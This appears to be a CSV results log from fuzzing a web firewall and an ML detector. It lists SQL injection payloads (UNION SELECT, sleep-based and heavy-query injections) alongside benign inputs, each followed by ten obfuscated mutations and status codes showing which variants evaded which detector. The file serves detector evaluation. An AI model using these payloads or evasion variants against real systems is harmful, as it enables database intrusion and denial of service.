Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
1,2024-12-18T09:32:16.631711,"1%"" union all select null,null--",403,403,403,both_correct,"(SELECT 8874 LIKE  OR 0)%""/**/union	all SElect null,null--",2024-12-18T09:32:19.154387,403,403,both_correct,"(sElEcT 'V;' LIKE 'V;' lIKe  oR  oR (SELeCt 0))%"" union	all
SelEcT null,null--",2024-12-18T09:32:23.220111,403,403,both_correct,"(SELEct 'V;'/**/Like 'V;' LIKE
 oR  OR (seLEcT (SELECT  AND 1)=2011))%"" union	all
sELecT null,null--",2024-12-18T09:32:28.010051,403,403,both_correct,"(sElECT 'V;'/**/lIKe 'V;'
LiKe
 Or  or (seLeCT (sElECT  And 'K'/**/NOT LIKE 'KW')= OR (SELECT 0)))%"" union	all
SElect null,null--",2024-12-18T09:32:33.921391,403,403,both_correct,"(seLect 'V;'/**/likE 'V;' LIke
 ||  OR/**/(SeleCT (SeLECT  aNd 'K'/*-hNq>*/NOT LIKE 'KW')= or (SelEct (SELECT 'Ej,g;'<>'Ej,g;@'))))%"" union	all
SelEcT null,null--",2024-12-18T09:32:41.269770,403,403,both_correct,"(sElECT 'V;'/**/like 'V;' LiKe
  OR   OR/*E*/(sELect (SELEct  and 'K'/*-hNq>*/NOT LIKE 'KW')= OR/**/(SeLecT (seLeCT 'Ej,g;'<>'Ej,g;@'))))%"" union
all
SELecT null,null--",2024-12-18T09:32:49.983251,403,200,waf_correct_ml_incorrect,"(SEleCt 'V;' LiKe 'V;' LIke
  Or   OR/*E*/(selEcT (selEct  and 'K'/**/NOT LIKE 'KW') like  oR/*QbI=_*/(SelEcT	(SELEcT 'Ej,g;'<>'Ej,g;@'))))%"" union
all
sELeCT null,null--",2024-12-18T09:32:58.987410,403,403,both_correct,"(SELEcT 'V;' likE 'V;' lIkE
  oR   Or/*E*/(SELEcT (SELEcT  aNd 'K'/*)""0x8*/not like 'KW') LikE  Or (selECt
(sElecT 'Ej,g;'<>'Ej,g;@'))))%"" union
all
SELECt null,null--",2024-12-18T09:33:08.351998,403,403,both_correct,"(seLEcT 'V;' LiKe 'V;' lIKE   OR   or/*(kj7*/(sElEcT/**/(sElECt  aNd 'K'/*)""0x8*/not like 'KW') lIKe  OR (seLECt
(SeLeCT 'Ej,g;' not like 'Ej,g;@'))))%"" union
all
SeLEct null,null--",2024-12-18T09:33:17.375597,403,200,waf_correct_ml_incorrect,"(SELECT 'V;' LIkE 'V;' LIkE   oR   or/*(kj7*/(SElECT/**/(sEleCT  aNd 'K'/*)""0x8*/not like 'KW') Like  || (sELECT
(seLeCt 'Ej,g;'/*xi;!*/not like 'Ej,g;@'))))%"" union	all
SELECT null,null--",2024-12-18T09:33:27.091247,403,403,both_correct
2,2024-12-18T09:33:37.335403,"nardo, 12, 13e",200,200,200,both_correct,"nardo,  OR (SELECT/**/';' not like ';~'),
13e",2024-12-18T09:33:38.162469,200,403,waf_correct_ml_incorrect,"nardo,  Or (SELect ';' not like
';~'),
13e",2024-12-18T09:33:41.427752,200,200,both_correct,"nardo,
/*n*/or (SeLECT ';' not like
';~'),
13e",2024-12-18T09:33:44.578300,200,200,both_correct,"nardo,
/**/oR
(sEleCt/**/';' not like
';~'),
13e",2024-12-18T09:33:47.897254,403,200,waf_incorrect_ml_correct,"nardo,	 OR
(SeLecT/**/';' not like
';~'),
13e",2024-12-18T09:33:51.297282,403,200,waf_incorrect_ml_correct,"nardo,
 ||
(selEct ';' not like
';~'),
13e",2024-12-18T09:33:54.532836,403,200,waf_incorrect_ml_correct,"nardo,/**/  Or 
(seLECt ';' not like
';~'),
13e",2024-12-18T09:33:57.618787,403,200,waf_incorrect_ml_correct,"nardo, 	 or 
(SELeCt ';' not like
';~'),
13e",2024-12-18T09:34:00.976270,403,200,waf_incorrect_ml_correct,"nardo, /**/ OR 
(seLect ';' not like
';~'),
13e",2024-12-18T09:34:04.181712,403,200,waf_incorrect_ml_correct,"nardo, /**/ Or/**/
(SElect ';' not
like
';~'),
13e",2024-12-18T09:34:07.800922,403,200,waf_incorrect_ml_correct
3,2024-12-18T09:34:11.288375,6.34182E+15,200,200,200,both_correct,"(sELECT/**/ Or 5198 IN (5197,5198,5199)).34182E+15",2024-12-18T09:34:11.950146,403,403,both_incorrect,"(SeLEct/*g*/ Or 5198/**/iN
(0x144d,(sElect '?'<>'?''),5199)).34182E+15",2024-12-18T09:34:15.451555,403,200,waf_incorrect_ml_correct,"(selEcT/*H}{W*/ OR 0x144e iN
(0x144d,(SELECt '?' not like '?''), AND 1)).34182E+8782	iN (8781,8782,8783)",2024-12-18T09:34:19.872772,403,403,both_incorrect,"(SElEcT/**//**/Or 0x144e In	(0x144d,(SeLeCt '?' not like '?''), and  AND 1)).34182E+(SelEct 8782)	In (993 LIKE 993,8782,8783)",2024-12-18T09:34:25.881492,403,403,both_incorrect,"(SelEcT /**/OR 0x144e iN	(0x144d,(SeLEcT '?' not like '?''), AND  And 1)).34182E+(selECt 8782)	iN ( oR 4338 NOT LIKE 0x10f3 like	993,8782,8783)",2024-12-18T09:34:32.841390,403,200,waf_incorrect_ml_correct,"(sElect /*~*/Or/**/0x144e IN	(0x144d,(SElecT '?' not
like '?''), AND  AND 1)).34182E+(SELeCT 8782)	iN ( Or 4338 NOT LIKE 0x10f3 LIKe	993,8782,(SELecT  || 'B(' LIKE 'B('))",2024-12-18T09:34:40.914653,403,403,both_incorrect,"(sELECT /*~*/or/**/0x144e In	(0x144d,(seleCt '?' not
like '?''), AND  AND (SELECT/**/1))).34182E+(SELeCT 8782)	iN ( Or 'c	&' LIKE 'c
&' NOT LIKE 0x10f3 LIKe	0x3e1,8782,(SELecT  || 'B(' LIKE 'B('))",2024-12-18T09:34:49.991041,403,403,both_incorrect,"(SELEcT /*~*/Or/**/0x144e in (0x144d,(SelECt '?' not
like '?''), AND  AND (SELECT/*;)H*/ OR (SELECT 'GcHMX'<>'GcHMX-')))).34182E+(SELeCT 8782)	iN/**/( Or 'c	&' LIKE 'c
&' NOT LIKE 0x10f3 LIKe	0x3e1,8782,(SELecT  || 'B(' LIKE 'B('))",2024-12-18T09:35:00.250612,403,403,both_incorrect,"(SeLEct /**/oR/**/0x144e IN (0x144d,(SeleCt '?' not
like '?''),/**/AND  AND (SELECT/*;)H*/ OR (SELECT 'GcHMX'<>'GcHMX-')))).34182E+(SELeCT  OR 6946 LIKE 6946)	iN/**/( Or 'c &' LIKE 'c
&' NOT LIKE 0x10f3 LIKe	0x3e1,0x224e,(SELecT  || 'B(' LIKE 'B('))",2024-12-18T09:35:12.510957,403,403,both_incorrect,"(SeLeCT  OR/**/0x144e iN (0x144d,(SeLEct '?' not
like '?''),/**/AND  AND (SELECT/*;)H*/ OR (SELECT 'GcHMX'<>'GcHMX-')))).34182E+(SELeCT  OR (SELECT 6946) LIKE  AND 5646 LIKE 5646) iN/**/( Or 'c &' LIKE 'c
&' NOT LIKE 0x10f3 LIKe	0x3e1,0x224e,(SELecT  || 'B(' LIKE 'B('))",2024-12-18T09:35:25.309457,403,403,both_incorrect
4,2024-12-18T09:35:39.372796,3.64462E+15,200,200,200,both_correct,"3.64462E+(SELECT /**/AND
3711 NOT LIKE 3712)",2024-12-18T09:35:40.025987,200,403,waf_correct_ml_incorrect,3.64462E+(SeLEcT  ANd 0xe7f not like ' OR 0|' Like '7|'),2024-12-18T09:35:43.239450,403,403,both_incorrect,(SeLECT 3).64462E+(SelecT  aND 0xe7f not like ' OR 0|'	LiKE '(SELECT/**/'_'='_')|'),2024-12-18T09:35:46.944660,403,403,both_incorrect,"(selECt  And 0x1).64462E+(SelEcT  aND 0xe7f not like ' OR 'b'!='b_'|'
lIKE '(SELECT '_'='_')|')",2024-12-18T09:35:51.992855,403,403,both_incorrect,"(sELeCt  aND 0x1).64462E+(SeLECt  && 0xe7f
not like ' OR 'b'!='b_'|'
like/**/'(SELECT '_'='_')|')",2024-12-18T09:35:57.861858,403,403,both_incorrect,"(SeLect  and 0x1).64462E+(seLEcT   aNd  0xe7f
not	like ' OR 'b'!='b_'|'
LiKE '(SELECT '_'='_')|')",2024-12-18T09:36:03.540246,403,403,both_incorrect,"(selecT  AND 0x1).64462E+(sElecT 	 and  0xe7f
not	like ' OR 'b'!='b_'|'
like '(SELECT/**/'_'='_')|')",2024-12-18T09:36:09.159221,403,403,both_incorrect,"(SeLECt  aNd 0x1).64462E+(seLEcT 	 ANd  0xe7f
not
like ' OR 'b'!='b_'|'
LiKE '(SELECT '_'='_')|')",2024-12-18T09:36:15.019253,403,403,both_incorrect,"(sELect  and 0x1).64462E+(sEleCT 	 &&  0xe7f
not
like
'/**/OR 'b'!='b_'|'
LiKE '(SELECT '_'='_')|')",2024-12-18T09:36:20.666570,403,200,waf_incorrect_ml_correct,"(sELect /**/anD 0x1).64462E+(sELecT 	  AND   0xe7f	not
like
'/*TSm/*/OR 'b'!='b_'|'
Like '(SELECT '_'='_')|')",2024-12-18T09:36:26.836804,403,200,waf_incorrect_ml_correct
5,2024-12-18T09:36:33.015159,1   )    )    as emtf where 3561  =  3561 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,403,403,403,both_correct,1   ) 	  )    As emtf Where (SELECT 3561)  =  6361 NOT LIKE (SELECT 1) oR   (  sELeCT * fROm   (  sELECt  (  sleep  (  5   ) /**/  )     )  ydpu  )  --,2024-12-18T09:36:38.727690,403,403,both_correct,"1	  ) 	  )    as emtf wherE (seleCt (sElECt 3561))   LiKe    OR 0 NOT LIKE (selEct 'p,' NOT LIKE 'p,O') OR   (  Select * FROM   (  SelecT  (  sleep  (  5   )    )     )  ydpu  )  --",2024-12-18T09:36:46.968366,403,403,both_correct,"4556=4556   ) 	  )    As emtf WHeRe/**/(SeLecT (SelECT 0xde9))   like    or  AND 1 NOT LIKE (SEleCt 'p,' not like 'p,O') oR   (  sElect * FROm   (  SeLECt  (  sleep  (  5   )    )     )  ydpu  )  --",2024-12-18T09:36:56.881303,403,403,both_correct,"4556=3884 IN (3883,3884,3885)   ) 	  )    AS emtf whERe (SElECT (SELeCT 0xde9))   liKe    Or  And (SELECT 1) NOT LIKE (SElect 'p,' not like 'p,O') or   (	 seLECt * FROm   (  sELeCT  (  sleep  (   && 1   )    )     )  ydpu  )  --",2024-12-18T09:37:07.179571,403,403,both_correct,"4556 like (SELECT 3884) In (3883, AND 1,3885)   ) 	 /**/)    As emtf wHERe (SeLEcT (selECt
0xde9))   liKe    or  aNd (SElEcT 'lsf?' Like 'lsf?') NOT LIKE (SElEct 'p,' not like 'p,O') or   (	 seLECT * FROm   (  seLECT  (  sleep  (   && 1   )    )     )  ydpu  )  --",2024-12-18T09:37:19.428146,403,403,both_correct,"4556 LikE (SelEcT /**/Or 0) in ('E!' LIkE 'E!', aND 0x1,3885)   ) 	 /**/)    as emtf Where (sELECt (SELEcT
0xde9))   Like    oR  And (selEcT 'lsf?' Like 'lsf?') NOT LIKE (SElecT 'p,' not like 'p,O') or   (	 selecT * FroM   (  sELEcT  (  sleep  (   && 1   )	   )     )  ydpu  )  --",2024-12-18T09:37:32.913944,200,403,waf_incorrect_ml_correct,"(seLeCT 1) LiKe (selEcT /**/or '2'!='2O') in ('E!' lIkE 'E!', anD 0x1,3885)   ) 	  )    As emtf WhEre (SelEcT (selEct
0xde9))   likE    or  And (seLEcT 'lsf?' lIkE 'lsf?') not like (SelECt 'p,' not like 'p,O') or   (	 SELecT * From  	(  sElEct  (  sleep  (   && 0x1   )	   )     )  ydpu  )  --",2024-12-18T09:37:47.362838,403,200,waf_correct_ml_incorrect,"(SeLECT (SELECT 1)) LIkE (SELect /**/or '2'!=''3Ht' LIKE '3Ht'O') in ('E!' likE 'E!', aNd 0x1,0xf2d)   ) 	  )    As emtf whErE (select (sELect
0xde9))   Like    Or  and (SelECt 'lsf?' lIkE/*1R*/'lsf?') not like (sElECt 'p,' not like 'p,O') or   (	 seLEcT * FrOM   (  seleCT  (  sleep  (    and  0x1   )	   )     )  ydpu  )  --",2024-12-18T09:38:02.524879,403,403,both_correct,"(SelEct (sElEcT  AND (SELECT 1))) LiKE (sElECt  or ''@'!='@-''!=''3Ht' LIKE '3Ht'O') iN ('E!' LIKe 'E!', && 0x1,0xf2d)   ) 	  )    AS emtf WheRe (seLeCt (selECT
0xde9))   LIkE    Or  and (SELeCT 'lsf?' like/**/'lsf?') not like (SElEct 'p,' not like 'p,O') or   (	 sELeCt * fRom   (  sELeCT  (  sleep  (    AnD  0x1   )	   )     )  ydpu  ) 
--",2024-12-18T09:38:19.314172,403,403,both_correct,"(seLect (SeleCT  and (SELeCt 'X' NOT LIKE 'X]'))) lIke (sElecT  Or ''@'!='@-'' not like ''3Ht' LIKE '3Ht'O') IN ('E!' LIKE 'E!', && 0x1,0xf2d)   ) 	  )    As emtf whERE (seLeCt (selECT
0xde9))   LiKE    or  ANd (sElecT 'lsf?' lIkE 'lsf?') not like (SElEcT 'p,' not like 'p,O') oR   (	 SElECt * fRoM   (  SeLEcT  (  sleep  (    ANd  0x1   )
   )     )  ydpu  ) 
--",2024-12-18T09:38:36.651079,403,403,both_correct
6,2024-12-18T09:38:54.690996,"toril, 171 5h",200,200,200,both_correct,"toril,/**/(sEleCt (SELECT 1))<>5720
5h",2024-12-18T09:38:55.443357,403,403,both_incorrect,"toril,/*_k*/(SeLeCT/**/(sElEct	(SELECT 1)))!=8187=(SELECT 8187)
5h",2024-12-18T09:38:58.576059,403,403,both_incorrect,"toril,/*<D*/(selEcT (sElEcT	(SELect 1)))!=8187 liKe (SElEct 7508!= And (SeleCt 1)) 5h",2024-12-18T09:39:02.987284,403,200,waf_incorrect_ml_correct,"toril,/*2W*/(sELEct
(seLEcT	(selEcT (SeLEcT 4691 NOT LIKE 4692))))<>8187 liKE (selEcT 7508!=/**/anD (selECT  aNd 1)) 5h",2024-12-18T09:39:08.090174,403,200,waf_incorrect_ml_correct,"toril,/*P*/(SELEcT	(sElect	(SeLect (SElEct (SELECT 4691) not like 4692))))<>(SEleCt 1) LikE (sELEcT 'k'='k'!= aND (seleCT  aNd 1)) 5h",2024-12-18T09:39:14.846117,403,403,both_incorrect,"toril, (sELECT	(seLECt	(seleCT (select (SelEcT 4691) not like  AND 1))))!=(selEct '?' NOT LIKE '?P') lIkE (seleCT 'k'='k'!=
aNd (Select  aNd (SELECT 1))) 5h",2024-12-18T09:39:22.248538,403,403,both_incorrect,"toril, (SeLeCt	(SELEcT	(SelEct/**/(SEleCT (selECT  AND 1) not like  and 1))))!=(SELeCt '?' NOT LIKE '?P') LIkE (sELecT 'k' like 'k'!= ANd (seleCT  And (seLEcT 5770 LIKE (SELECT 5770)))) 5h",2024-12-18T09:39:30.991280,403,403,both_incorrect,"toril, (SelEcT	(SelECt	(selECt/**/(SELEct (SElECT
 AND (SELECT  AND 1)) not like  aND 1))))!=(SeleCt '?' not like '?P') likE (sEleCt 'k' lIKE 'k'!= aND (SeLECt /*uq*/aNd (sELecT 5770 liKe (selECT '+'='+')))) 5h",2024-12-18T09:39:40.757663,403,403,both_incorrect,"toril, (SELect	(SelECt	(SELEct (SeLECt (seLECT	 and (select  AND  OR '' lIKe '')) not like  ANd 0x1)))) not like (SEleCt '?' not like '?P') LikE (SELect 'k' lIKe 'k'!= anD (SelECT /**/ANd (selECT 5770 liKe (selECt '+'='+')))) 5h",2024-12-18T09:39:51.939855,403,403,both_incorrect,"toril, (SeLeCt	(seLeCT	(selECt (SEleCt (SeLECt	 anD (SelEcT
 ANd  or '' like '')) not like  aND 0x1)))) not like (seleCT '?' not like '?P') like (sElect 'k' lIKE 'k'!=/**/AnD (SELEcT /**/aND (seLEcT (SeLECt '	' LIKE '	') LIKe (SElect '+' LIKE '+')))) 5h",2024-12-18T09:40:03.917091,403,403,both_incorrect
7,2024-12-18T09:40:16.969746,"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'vwtq'  =  'vwtq",403,403,200,waf_correct_ml_incorrect,"1'   )    )    and char  (
 120  )  ||char  (  (SELECT 106)  )  ||char  (  's@3' NOT LIKE 's@3z'  )  ||char  (  (SELECT 1)  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0/**/ )  ,5000000000  )  ,null  )   and    (    (   'vwtq'  =  'vwtq",2024-12-18T09:40:27.789441,403,403,both_correct,"0x1'   )    )    and char  (
 120  )  ||char  (  (SELECT 106)  )  ||char  (  's@3' NOT LIKE 's@3z'  )  ||char  (  (SELECT 1)  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  , OR 0  )  ,8745 LIKE 8745  )  ,null  )   and    (    (   'vwtq'  =
 'vwtq",2024-12-18T09:40:41.175432,403,403,both_correct,"0x1'   )    )    and char  (	 120  )  ||char  (  (SELECT 106)  )  ||char  (  's@0x3' NOT LIKE 's@3z'  )  ||char  (/**/ (SELECT 1)  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  , OR 'YEh'<>'YEh7'  )  , AND 1 LIKE 8745  )  ,null  )   and    (    (   'vwtq'  =
 'vwtq",2024-12-18T09:40:55.111900,403,403,both_correct,"0x1'   )    )    and char  (
 120  )  ||char  (  (SELECT 106)  )  ||char  (  's@0x3' NOT LIKE 's@3z'  )  ||char  (/**/ (SELECT 1)  )    =  regexp_substring  (  repeat  (  right  (  char  (  4348 NOT LIKE 4349  )  , OR 'YEh'<>'YEh7'  )/*)T*/ , AND  AND (SELECT 1) LIKE 8745  )  ,null  )   and    (    (   'vwtq'  =
 'vwtq",2024-12-18T09:41:09.884829,403,403,both_correct,"0x1'   )    )    and char  (
 0x78  )  ||char  (  (SELECT 106)  )  ||char  (  's@0x3' NOT LIKE 's@3z'  )  ||char  (/**/ (SELECT '^ Q' LIKE '^ Q')	 )    =  regexp_substring  (  repeat  (  right /**/(  char  (  (SELECT 1) NOT LIKE 4349  )  , OR 'YEh'<>'YEh7'  )/*)T*/ , AND  AND (SELECT 1) LIKE 8745  )  ,null  )   and    (    (   'vwtq'  =
 'vwtq",2024-12-18T09:41:25.964230,403,403,both_correct,"0x1'   )    )    and char  (
 0x78  )  ||char  (  (SELECT  OR 0)  )  ||char  (  's@0x3' NOT LIKE 's@3z'  )  ||char  (/**/ (SELECT '^ Q' LIKE '^ Q')
 )    =  regexp_substring  (  repeat  (  right /**/(  char  (  (SELECT (SELECT 1)) NOT LIKE 4349  )  , OR 'YEh'<>'YEh7' /**/)/*)T*/ , AND  AND (SELECT ']U' NOT LIKE ']U`') LIKE 8745  )  ,null  )   and    (    (   'vwtq'  =
 'vwtq",2024-12-18T09:41:43.407665,403,403,both_correct,"0x1'   )    )    and char  (
 0x78  )  ||char  (  (SELECT  OR 0x0)  )  ||char  (  's@0x3' NOT LIKE 's@3z'  )  ||char  (/**/ (SELECT '^ Q' LIKE '^ Q')
 )    =  regexp_substring  (  repeat  (  right /**/(  char  (  (SELECT (SELECT  AND 1)) NOT LIKE 662 NOT LIKE 663  )  ,/**/OR 'YEh'<>'YEh7' /**/)/*)T*/ , AND  AND (SELECT ']U' NOT LIKE ']U`') LIKE 8745  )  ,null  )   and    (    (   'vwtq'  =  'vwtq",2024-12-18T09:42:02.201785,403,403,both_correct,"0x1'   )    )    and char  (
 0x78  )  ||char  (  (SELECT  OR 0x0)  )  ||char  (  's@0x3' NOT/**/LIKE 's@3z'  )  ||char  (/**/ (SELECT '^ Q' LIKE '^ Q')  )    =  regexp_substring  (  repeat  (  right /**/(  char  (  (SELECT (SELECT  AND 1)) NOT LIKE  OR 0 NOT LIKE 8607=8607  )  ,/**/OR 'YEh'<>'YEh7' /**/)/*)T*/ , AND  AND (SELECT ']U' NOT LIKE ']U`') LIKE 0x2229  )  ,null  )   and    (    (   'vwtq'  =  'vwtq",2024-12-18T09:42:22.180257,403,403,both_correct,"0x1'   )    )    and char  (
 0x78  )  ||char  (  (SELECT  OR 0x0)  )  ||char  (  's@0x3' NOT/**/LIKE 's@3z'  )  ||char  (/*[Mv*/ (SELECT '^ Q' LIKE '^ Q')  )    =  regexp_substring  (  repeat  (  right /**/(  char  (  (SELECT (SELECT  AND 7950<>7951)) NOT LIKE  OR 0 NOT LIKE
8607= AND (SELECT 1)  )  , OR 'YEh'<>'YEh7' /**/)/*)T*/ , AND  AND (SELECT ']U' NOT LIKE ']U`') LIKE 0x2229  )  ,null  )   and    (    (   'vwtq'  =  'vwtq",2024-12-18T09:42:42.710235,403,403,both_correct,"0x1'   )    )    and char  (
 0x78  )  ||char  (  (SELECT  OR 0x0)  )  ||char  (  's@0x3' NOT/**/LIKE 's@3z'  )  ||char  (/*[Mv*/ (SELECT '^ Q' LIKE '^ Q')  )    =  regexp_substring  (  repeat  (  right /**/(  char  (  (SELECT (SELECT  AND (SELECT 7950)<> OR 0)) NOT LIKE  OR 0 NOT LIKE 8607= AND (SELECT 'T'!='TH')  )  , OR 'YEh'<>'YEh7'  )/*)T*/ , AND  AND (SELECT ']U' NOT LIKE ']U`') LIKE 0x2229  )  ,null  )   and    (    (   'vwtq'  =  'vwtq",2024-12-18T09:43:04.316085,403,403,both_correct
8,2024-12-18T09:43:26.561488,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'inec'  =  'inec",403,403,200,waf_correct_ml_incorrect,"selEct lIkE  (  'abcdefg',upper  (  hex  (  randomblob  (  (sElECT  or 0)/2   )    )      )	   )    AnD   (  'inec'   LIKe  /*,u`' ' NOT LIKE ' y'*/'inec",2024-12-18T09:43:32.403329,403,200,waf_correct_ml_incorrect,"SeLEct liKe  (  'abcdefg',upper  (  hex  ( 	randomblob  (  (SELeCt  or (SeLeCt 6267 iN (6266,6267,6268)))/0x2   )  /**/ )      )	   )    And   (  'inec'   LIKe  /*,u`' ' NOT LIKE ' y'*/'inec",2024-12-18T09:43:40.901675,403,403,both_correct,"seLECt lIkE  (  'abcdefg',upper  (  hex  ( 	randomblob  (  (sEleCT  OR (SELEct 6267 in (6266,1415 not like (SeLEcT 0x1),6268)))/0x2   )    )      )    )    And   (  'inec'   lIkE  /*E)5*/'inec",2024-12-18T09:43:50.815544,403,200,waf_correct_ml_incorrect,"SeLEct lIke  (  'abcdefg',upper  (  hex  ( 	randomblob  (  (sELeCT  || (sElecT 'Ey'='Ey' IN (6266,1415 not like (SElect 0x1),(SEleCt 6268))))/0x2   )    )     /**/)   	)    And   (  'inec'   liKE  /*E)(SELECT 1)*/'inec",2024-12-18T09:44:01.158158,403,200,waf_correct_ml_incorrect,"seLeCT lIKE  (  'abcdefg',upper  (  hex  (		randomblob  (  (SELeCt  || (SelECT 'Ey' LIKE 'Ey' in (6266,9608= AND 1 not like (SelEct 0x1),(SElEcT 6268))))/0x2   )    )      )   	)    AND   (  'inec'   likE  /*E)(SELECT 0x1)*/'inec",2024-12-18T09:44:12.642244,403,403,both_correct,"SElEcT lIKe  (  'abcdefg',upper  (  hex  (		randomblob  (  (sELecT  || (seLect 'Ey' like 'Ey' in (9310<>9311,9608 LIKE  aNd  And 1 not like (selecT 0x1),(seLEct 0x187c))))/0x2   )    )      )   
)    AnD /**/ (  'inec'   LIkE  /*E)(SELECT 0x1)*/'inec",2024-12-18T09:44:24.617163,403,403,both_correct,"seLEct likE  (  'abcdefg',upper  (  hex  (		randomblob  (  (select   oR  (SeleCT 'Ey' lIkE 'Ey' iN (9310<>(seLecT  AND 1),9608 Like  AnD  aNd 'Fd' NOT LIKE 'Fd_' not like (seLECT 0x1),(sELEcT 0x187c))))/0x2   )  /**/ )      )    )    aND /**/ (  'inec'   liKe  /*E)(SELECT 0x1)*/'inec",2024-12-18T09:44:37.823713,403,403,both_correct,"SeLeCT LikE  (	 'abcdefg',upper  (  hex  (		randomblob  (  (sELecT  /**/or  (SELeCT 'Ey' lIkE 'Ey' In (9987!=9988<>(sELect  and (seLEcT  or 0)),9608 LiKE  aND  ANd 'Fd' NOT LIKE 'Fd_' not like (SelecT 0x1),(SELecT 0x187c))))/0x2   )  /**/ )      )    )    aNd /**/ (  'inec'   LiKE  /*E)(SELECT 0x1)*/'inec",2024-12-18T09:44:52.593490,403,200,waf_correct_ml_incorrect,"sElecT like  (	 'abcdefg',upper  (  hex  ( 	randomblob  (  (SELeCt  /**/or  (selECt 'Ey' lIKe 'Ey' IN (9987!= AnD 4479!=4480<>(SELECt  anD (seLECT  Or 0)),0x2588 lIkE  anD  and 'Fd' not like 'Fd_' not like (sELECT 0x1),(SeLEct 0x187c))))/0x2   )    )      )    )    ANd /**/ (  'inec'   liKE  /*E)(SELECT 0x1)*/'inec",2024-12-18T09:45:08.202274,403,403,both_correct,"sElect LikE  (	 'abcdefg',upper  (  hex  ( 	randomblob  (  (sELECT   oR  (seLECT 'Ey' LiKe 'Ey' In (9987!= anD  AnD 1!=(SELECT 5394) not like 5395<>(sELeCt  aND (SeleCT  OR 0)),0x2588 LikE  aNd  aNd 'Fd' not like 'Fd_' not like (selECT 0x1),(SeLEcT 0x187c))))/0x2   )    ) 	    )    )    and /**/ (  'inec'   LIkE  /*E)(SELECT 0x1)*/'inec",2024-12-18T09:45:24.511806,403,200,waf_correct_ml_incorrect
9,2024-12-18T09:45:41.439846,8271,200,200,200,both_correct,']'=']',2024-12-18T09:45:41.938727,200,200,both_correct,']' like ']',2024-12-18T09:45:43.455455,200,403,waf_correct_ml_incorrect,"']'/**/liKe
']'",2024-12-18T09:45:45.184447,200,200,both_correct,"']'
lIkE
']'",2024-12-18T09:45:47.071484,200,200,both_correct,"']'	lIKe
']'",2024-12-18T09:45:48.753959,200,200,both_correct,"']'/**/liKE
']'",2024-12-18T09:45:50.458459,200,200,both_correct,"']'
lIkE
']'",2024-12-18T09:45:52.292280,200,200,both_correct,"']'
liKe	']'",2024-12-18T09:45:53.993207,200,200,both_correct,"']'
lIKE
']'",2024-12-18T09:45:55.691495,200,200,both_correct,"']'
LiKe	']'",2024-12-18T09:45:57.374441,200,200,both_correct
10,2024-12-18T09:45:59.058634,manjarrs,200,200,200,both_correct,manjarrs,2024-12-18T09:45:59.570284,200,200,both_correct,manjarrs,2024-12-18T09:46:01.064456,200,200,both_correct,manjarrs,2024-12-18T09:46:02.585467,200,200,both_correct,manjarrs,2024-12-18T09:46:04.104378,200,200,both_correct,manjarrs,2024-12-18T09:46:05.593995,200,200,both_correct,manjarrs,2024-12-18T09:46:07.107780,200,200,both_correct,manjarrs,2024-12-18T09:46:08.611722,200,200,both_correct,manjarrs,2024-12-18T09:46:10.122599,200,200,both_correct,manjarrs,2024-12-18T09:46:11.635000,200,200,both_correct,manjarrs,2024-12-18T09:46:13.143762,200,200,both_correct
